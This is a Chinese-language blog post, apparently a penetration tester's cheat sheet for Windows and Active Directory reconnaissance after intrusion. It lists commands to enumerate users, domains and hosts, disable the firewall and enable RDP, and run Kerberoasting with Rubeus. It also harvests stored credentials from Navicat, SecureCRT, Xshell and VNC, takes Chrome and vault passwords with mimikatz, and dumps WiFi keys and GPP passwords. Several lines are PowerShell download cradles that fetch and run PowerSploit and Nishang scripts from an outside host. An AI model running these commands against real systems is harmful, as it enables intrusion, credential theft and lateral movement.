

<!DOCTYPE html>
<html lang="en" color-mode=light>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>windows信息收集 - jinny</title>
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="google" content="notranslate" />
  
  <meta name="description" content="本机信息收集用户信息123查看本地用户：net use...">
  <meta name="author" content="jinny">
  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
  
    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
    <meta rel="msapplication-TileColor" content="#000000">
  

  
<link rel="stylesheet" href="/css/style.css">


  
    
<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">

  

  
    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">

  

  
    
      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">

      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">

      
  

  <script>
    var CONFIG = window.CONFIG || {};
    var ZHAOO = window.ZHAOO || {};
    CONFIG = {
      isHome: false,
      fancybox: true,
      pjax: false,
      lazyload: {
        enable: true,
        only_post: 'false',
        loading: '[object Object]'
      },
      donate: {
        enable: true,
        alipay: '',
        wechat: ''
      },
      galleries: {
        enable: true
      },
      fab: {
        enable: true,
        always_show: false
      },
      carrier: {
        enable: true
      },
      daovoice: {
        enable: false
      },
      preview: {
        background: {
          default: '',
          api: ''
        },
        motto: {
          default: '我在开了灯的床头下，想问问自己的心啊。',
          typing: true,
          api: 'https://v2.jinrishici.com/one.json',
          data_contents: '["data","content"]'
        },
      },
      qrcode: {
        enable: false,
        type: 'url',
        image: 'https://pic.izhaoo.com/weapp-code.jpg',
      },
      toc: {
        enable: true
      },
      scrollbar: {
        type: 'default'
      },
      notification: {
        enable: false,
        delay: 4500,
        list: '',
        page_white_list: '',
        page_black_list: ''
      },
      search: {
        enable: false,
        path: ''
      }
    }
  </script>

  

  

<meta name="generator" content="Hexo 5.4.0"></head>

<body class="lock-screen">
  <div class="loading"></div>
  
    


  <nav class="navbar">
    <div class="left">
      
        <i class="iconfont iconhome j-navbar-back-home"></i>
      
      
      
        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
      
      
    </div>
    <div class="center">windows信息收集</div>
    <div class="right">
      <i class="iconfont iconmenu j-navbar-menu"></i>
    </div>
    
  </nav>

  
  

<nav class="menu">
  <div class="menu-container">
    <div class="menu-close">
      <i class="iconfont iconbaseline-close-px"></i>
    </div>
    <ul class="menu-content"><li class="menu-item">
        <a href="/ " class="underline "> 首页</a>
      </li><li class="menu-item">
        <a href="/galleries/ " class="underline "> 摄影</a>
      </li><li class="menu-item">
        <a href="/archives/ " class="underline "> 归档</a>
      </li><li class="menu-item">
        <a href="/tags/ " class="underline "> 标签</a>
      </li><li class="menu-item">
        <a href="/categories/ " class="underline "> 分类</a>
      </li><li class="menu-item">
        <a href="/about/ " class="underline "> 关于</a>
      </li></ul>
    
      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://pl.jinny.vip">jinny</a></div>
    
  </div>
</nav>
  <main id="main">
  <div class="article-wrap">
    <div class="row container">
      <div class="col-xl-3"></div>
      <div class="col-xl-6"><article class="article">
  <div class="wrap">
    <section class="head">
  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
  <div class="head-mask">
    <h1 class="head-title">windows信息收集</h1>
    <div class="head-info">
      <span class="post-info-item"><i class="iconfont iconcalendar"></i>June 29, 2020</span>
      
      <span class="post-info-item"><i class="iconfont iconfont-size"></i>9369</span>
    </div>
  </div>
</section>
    <section class="main">
      <section class="content">
        <h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><h5 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看本地用户：net user</span><br><span class="line">查看本地管理员组（通常包含域用户）：net localgroup administrators</span><br><span class="line">查看指定用户详细信息：net user xxx   </span><br></pre></td></tr></table></figure>

<h5 id="查看补丁列表"><a href="#查看补丁列表" class="headerlink" title="查看补丁列表"></a>查看补丁列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<h5 id="查看当前用户、权限"><a href="#查看当前用户、权限" class="headerlink" title="查看当前用户、权限"></a>查看当前用户、权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">whoami &#x2F;all      &#x2F;&#x2F; 查看当前域并获取域SID</span><br></pre></td></tr></table></figure>

<h5 id="查看网络配置情况"><a href="#查看网络配置情况" class="headerlink" title="查看网络配置情况"></a>查看网络配置情况</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all              &#x2F;&#x2F; 查询本机IP段，所在域等</span><br><span class="line">route print                &#x2F;&#x2F; 打印路由信息</span><br><span class="line">arp -a                     &#x2F;&#x2F; 查看arp缓存，可以发现内网主机</span><br></pre></td></tr></table></figure>

<h5 id="查看操作系统信息"><a href="#查看操作系统信息" class="headerlink" title="查看操作系统信息"></a>查看操作系统信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo,winver</span><br></pre></td></tr></table></figure>

<h5 id="查看操作系统及版本"><a href="#查看操作系统及版本" class="headerlink" title="查看操作系统及版本"></a>查看操作系统及版本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;          &#x2F;&#x2F; 中文操作系统</span><br></pre></td></tr></table></figure>

<h5 id="查看系统体系结构"><a href="#查看系统体系结构" class="headerlink" title="查看系统体系结构"></a>查看系统体系结构</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>

<h5 id="查看安转的软件及版本信息"><a href="#查看安转的软件及版本信息" class="headerlink" title="查看安转的软件及版本信息"></a>查看安转的软件及版本信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>

<h5 id="列出本地计算机与所连接的客户端主机之间的会话"><a href="#列出本地计算机与所连接的客户端主机之间的会话" class="headerlink" title="列出本地计算机与所连接的客户端主机之间的会话"></a>列出本地计算机与所连接的客户端主机之间的会话</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>

<h5 id="查看本机共享"><a href="#查看本机共享" class="headerlink" title="查看本机共享"></a>查看本机共享</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br><span class="line">smbclient -I 目标ip -L administrator -N -U &quot;&quot;</span><br></pre></td></tr></table></figure>

<h5 id="查看本机进程"><a href="#查看本机进程" class="headerlink" title="查看本机进程"></a>查看本机进程</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line">wmic process</span><br><span class="line">wmic process list brief</span><br><span class="line">显示进程的路径、名称、pid：wmic process get processid,executablepath,name</span><br></pre></td></tr></table></figure>

<h5 id="查看本机服务"><a href="#查看本机服务" class="headerlink" title="查看本机服务"></a>查看本机服务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>

<h5 id="查看自启程序列表"><a href="#查看自启程序列表" class="headerlink" title="查看自启程序列表"></a>查看自启程序列表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startuo get command,caption</span><br></pre></td></tr></table></figure>

<h5 id="查看端口信息"><a href="#查看端口信息" class="headerlink" title="查看端口信息"></a>查看端口信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>

<h5 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>

<h5 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query显示所有计划任务：schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure>

<h5 id="防火墙相关操作"><a href="#防火墙相关操作" class="headerlink" title="防火墙相关操作"></a>防火墙相关操作</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">防火墙状态：netsh firewall show state</span><br><span class="line">查看防火墙配置：netsh firewall show config</span><br><span class="line">关闭防火墙（windows server 2003及以前）：netsh firewall set opmode disable</span><br><span class="line">关闭防火墙（windows server 2003以后）：netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<h6 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">允许指定程序的全部连接（windows server 2003及以前）：netsh firewall add allowedprogram c:\\xxx\\xx.exe &quot;allow xx&quot; enable </span><br><span class="line">windows server 2003之后：</span><br><span class="line">允许某个程序连入：netsh advfirewall firewall add rule name&#x3D;&quot;pass xx&quot; dir&#x3D;in action&#x3D;allow  program&#x3D;&quot;C:\xxx\xx.exe&quot; </span><br><span class="line">允许某个程序外连：netsh advfirewall firewall add rule name&#x3D;&quot;pass xx&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;C:\xxx\xx.exe&quot;</span><br><span class="line">开启3389端口，允许改端口放行：netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure>

<h5 id="开启远程桌面连接"><a href="#开启远程桌面连接" class="headerlink" title="开启远程桌面连接"></a>开启远程桌面连接</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>

<h4 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h4><h5 id="查看当前环境存在的域"><a href="#查看当前环境存在的域" class="headerlink" title="查看当前环境存在的域"></a>查看当前环境存在的域</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域：net config workstation</span><br><span class="line">查看域：net view &#x2F;domain</span><br></pre></td></tr></table></figure>

<h5 id="扫描SPN"><a href="#扫描SPN" class="headerlink" title="扫描SPN"></a>扫描SPN</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win自带工具：setspn -T domain.com -Q *&#x2F;*</span><br><span class="line">利用GetUserSPNs.vbs：cscript GetUserSPNs.vbs</span><br><span class="line">Rubeus工具：Rubeus.exe kerberoast</span><br><span class="line">     工具地址：https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;Rubeus</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查找包含关键字的文件：findstr  &#x2F;s &#x2F;m &quot;password&quot; *.*</span><br></pre></td></tr></table></figure>

<h5 id="用户信息发现"><a href="#用户信息发现" class="headerlink" title="用户信息发现"></a>用户信息发现</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看域用户，普通域用户权限：net user &#x2F;domain</span><br><span class="line">查看指定域用户详细信息：net user xxx &#x2F;domain</span><br><span class="line">获取域内用户详细信息：wmic useraccount get &#x2F;all</span><br><span class="line">查看域内用户组列表：net group &#x2F;domain</span><br><span class="line">查看域管理员：net group &quot;domain admins&quot; &#x2F;domain</span><br><span class="line">查看域系统管理员：net group &quot;Enterprise Admin&quot; &#x2F;domain</span><br><span class="line">快速定位域控ip，一般是dns、时间服务器：net time &#x2F;domain或者nslookup -type&#x3D;all_ldap._tcp.dc._msdcs.域名</span><br><span class="line">查看域控制器：net group &quot;domain controllers&quot; &#x2F;domain</span><br><span class="line">查看域控制器主机名，god为域名：nltest &#x2F;DCLIST:god</span><br><span class="line">查看所有的域成员主机（机器用户；不包括域控）：net group &quot;domain computers&quot; &#x2F;domain</span><br><span class="line">获取域密码信息：net accounts &#x2F;domain</span><br></pre></td></tr></table></figure>

<h5 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看共享资料：net view</span><br><span class="line">查看arp表：arp -a</span><br><span class="line">发现当前环境所有主机：netdiscover</span><br><span class="line">查看hosts文件：linux：cat  &#x2F;etc&#x2F;hosts，windows：type  c:\Windows\system32\drivers\etc\hosts</span><br><span class="line">查看dns缓存：ipconfig  &#x2F;displaydns</span><br><span class="line">nbtscan等工具扫描：nbtscan.exe 网段</span><br><span class="line">telnet端口扫描：telnet ip地址 端口</span><br><span class="line">PowerSploit端口扫描(或者扫描全部的端口：-Ports &quot;1-65535&quot;)：powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;39.xxx.xxx.210&#x2F;powersploit&#x2F;Recon&#x2F;Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.1.1&#x2F;24 -T 4 -ports &#39;445,1433,8080,80,3389&#39;&quot;</span><br><span class="line">Nishang端口扫描：powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;39.xxx.xxx.210&#x2F;nishang&#x2F;Scan&#x2F;Invoke-PortScan.ps1&#39;);Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost -Port &#39;1-65535&#39;&quot;</span><br><span class="line">msf主机探测模块</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;empty_udp                                           </span><br><span class="line">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe                              </span><br><span class="line">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep</span><br><span class="line">nbtscan快速扫描(多个段用空格隔开)：nbtscan.exe 192.168.1.0&#x2F;24</span><br><span class="line">nmap扫描：nmap -T4 -A ip段</span><br><span class="line">Ping探测内网主机存活：for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL&#x3D;&quot;</span><br><span class="line">arp探测工具：https:&#x2F;&#x2F;github.com&#x2F;MrAnonymous-1&#x2F;arp-scan</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用psloggedon探查域管理员登录过哪些主机：psloggedon.exe [-] [-l] [-x] [\\computername或username]</span><br><span class="line">查看登陆过OWA(域控)机器的用户：psloggedon.exe \\机器名</span><br><span class="line">指定用户名，在网络中查找指定用户登陆的计算机：psloggedon.exe 用户名</span><br><span class="line">查看本地登陆的用户：psloggedon.exe</span><br><span class="line">工具地址：https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;sysinternals&#x2F;downloads&#x2F;psloggedon</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用 PVEFindADUser.exe探查域用户与主机登录情况(计算机需要配置.NET Framework 2.0 环境，并需要有管理员权限)</span><br><span class="line">PVEFindADUser.exe -current</span><br><span class="line">工具地址：https:&#x2F;&#x2F;github.com&#x2F;chrisdee&#x2F;Tools&#x2F;tree&#x2F;master&#x2F;AD&#x2F;ADFindUsersLoggedOn</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用owerView.ps1脚本获取当前域管理员在线登录的服务器</span><br><span class="line">搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限(查看指定用户：-UserName 用户名)</span><br><span class="line">powershell.exe -exec bypass IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;39.xxx.xxx.210&#x2F;powersploit&#x2F;Recon&#x2F;PowerView.ps1&#39;);Invoke-UserHunter</span><br><span class="line">Get-NetSessions 和Get-NetLoggedon：扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限</span><br></pre></td></tr></table></figure>

<h5 id="获取banner"><a href="#获取banner" class="headerlink" title="获取banner"></a>获取banner</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap获取banner：nmap &lt;IP地址&gt; --script&#x3D;banner -p &lt;端口&#x2F;端口范围&gt;</span><br><span class="line">nc获取banner：nc -nv &lt;IP地址&gt; &lt;端口&gt;</span><br></pre></td></tr></table></figure>

<h5 id="会话收集"><a href="#会话收集" class="headerlink" title="会话收集"></a>会话收集</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看域用户登录过哪些机器：Import-Module .\PowerView.ps1 -&gt; Invoke-UserHunter -Username &quot;用户&quot;</span><br><span class="line">查看机器被哪些用户登陆过：Import-Module .\PowerView.ps1 -&gt; Get-NetSession -ComputerName dcserver</span><br></pre></td></tr></table></figure>

<h5 id="凭据收集"><a href="#凭据收集" class="headerlink" title="凭据收集"></a>凭据收集</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">远程连接凭据：cmdkey &#x2F;list</span><br><span class="line">navicat：</span><br><span class="line">MySQL：HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\&lt;your  connection name&gt;</span><br><span class="line">MariaDB：HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt;your  connection name&gt;</span><br><span class="line">MongoDB：HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\&lt;your  connection name&gt;</span><br><span class="line">Microsoft  SQL：HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt;your  connection name&gt;</span><br><span class="line">Oracle：HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt;your  connection name&gt;</span><br><span class="line">PostgreSQL：HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt;your  connection name&gt;</span><br><span class="line">SQLite：HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt;your  connection name&gt;</span><br></pre></td></tr></table></figure>

<h6 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xp&#x2F;win2003：C:\Documents   and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</span><br><span class="line">win7&#x2F;win2008以上：C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</span><br></pre></td></tr></table></figure>

<h6 id="Xshell"><a href="#Xshell" class="headerlink" title="Xshell"></a>Xshell</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Xshell5：%userprofile%\Documents\NetSarang\Xshell\Sessions</span><br><span class="line">Xshell6：%userprofile%\Documents\NetSarang  Computer\6\Xshell\Sessions</span><br></pre></td></tr></table></figure>

<h6 id="WinSCP"><a href="#WinSCP" class="headerlink" title="WinSCP"></a>WinSCP</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions</span><br></pre></td></tr></table></figure>

<h6 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RealVNC：HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver             Password</span><br><span class="line">TightVNC：HKEY_CURRENT_USER\Software\TightVNC\Server  Value            Password  or PasswordViewOnly</span><br><span class="line">TigerVNC：HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4    Password</span><br><span class="line">UltraVNC：C:\Program  Files\UltraVNC\ultravnc.ini   passwd or  passwd2</span><br></pre></td></tr></table></figure>

<h5 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h5><p>DPAPI采用的加密类型为对称加密，存放密钥的文件则被称之为Master Key Files，其路径一般为%APPDATA%\Microsoft\Protect{SID}{GUID}。其中{SID}为用户的安全标识符，{GUID}为主密钥名称。我们可以利用用户的密码/hash或域备份密钥解密主密钥，然后解密被dpapi加密的数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解密Chrome密码：mimikatz  dpapi::chrome &#x2F;in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login  Data&quot; &#x2F;unprotect</span><br><span class="line">解密Credential：mimikatz  vault::cred &#x2F;patch</span><br></pre></td></tr></table></figure>

<h5 id="域信任"><a href="#域信任" class="headerlink" title="域信任"></a>域信任</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看域信任：nltest  &#x2F;domain_trusts</span><br></pre></td></tr></table></figure>

<h5 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows：nslookup  -type&#x3D;ns domain.com，nslookup，sserver  dns.domain.com，ls  domain.com</span><br><span class="line">linux：dig  @dns.domain.com axfr domain.com</span><br></pre></td></tr></table></figure>

<h5 id="DNS记录获取"><a href="#DNS记录获取" class="headerlink" title="DNS记录获取"></a>DNS记录获取</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用Dnscmd工具获取dns记录：Dnscmd. &#x2F;ZonePrint 域名，Dnscmd. &#x2F;EnumRecords 域名 .</span><br><span class="line">非windows server：import-module  PowerView.ps1 -&gt; Get-DNSRecord  -ZoneName 域名</span><br></pre></td></tr></table></figure>

<h5 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI"></a>WIFI</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取连接过的wifi密码：for &#x2F;f  &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key&#x3D;clear</span><br></pre></td></tr></table></figure>

<h5 id="GPP-分发组策略"><a href="#GPP-分发组策略" class="headerlink" title="GPP(分发组策略)"></a>GPP(分发组策略)</h5><p>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。这些密码，往往都是管理员的密码。<br>其中xml中的密码是aes加密的，密钥已被微软公开：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-gppref&#x2F;2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom&#x3D;MSDN</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解密脚本：Get-GPPPassword.ps1</span><br><span class="line">域用户登录脚本存在目录也会存在敏感文件：\\domain\Netlogon</span><br></pre></td></tr></table></figure>

<h5 id="自动化信息收集"><a href="#自动化信息收集" class="headerlink" title="自动化信息收集"></a>自动化信息收集</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Seatbelt：https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;Seatbelt</span><br><span class="line">Bloodhound：https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;BloodHound</span><br></pre></td></tr></table></figure>

